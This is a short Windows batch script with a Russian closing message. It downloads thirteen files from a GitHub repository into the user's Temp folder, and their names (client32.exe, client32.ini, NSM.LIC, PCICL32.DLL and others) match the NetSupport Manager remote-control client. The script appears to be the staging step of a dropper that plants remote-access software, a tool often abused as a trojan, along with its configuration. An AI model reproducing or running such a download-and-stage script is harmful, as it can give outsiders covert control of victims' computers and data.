@echo off
set "TEMP=%USERPROFILE%\AppData\Local\Temp"

curl -L -o "%TEMP%\client32.exe" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe"
curl -L -o "%TEMP%\client32.ini" "https://raw.githubusercontent.com/MEMEOW-IO/test/refs/heads/main/client32.ini"
curl -L -o "%TEMP%\NSM.LIC" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC"
curl -L -o "%TEMP%\HTCTL32.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/HTCTL32.DLL"
curl -L -o "%TEMP%\msvcr100.dll" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/msvcr100.dll"
curl -L -o "%TEMP%\nskbfltr.inf" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nskbfltr.inf"
curl -L -o "%TEMP%\NSM.ini" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.ini"
curl -L -o "%TEMP%\nsm_vpro.inf" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nsm_vpro.inf"
curl -L -o "%TEMP%\AudioCapture.dll" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/AudioCapture.dll"
curl -L -o "%TEMP%\pcicapi.dll" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/pcicapi.dll"
curl -L -o "%TEMP%\PCICHEK.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICHEK.DLL"
curl -L -o "%TEMP%\PCICL32.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL"
curl -L -o "%TEMP%\TCCTL32.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL"

echo Файлы загружены в %TEMP%
pause
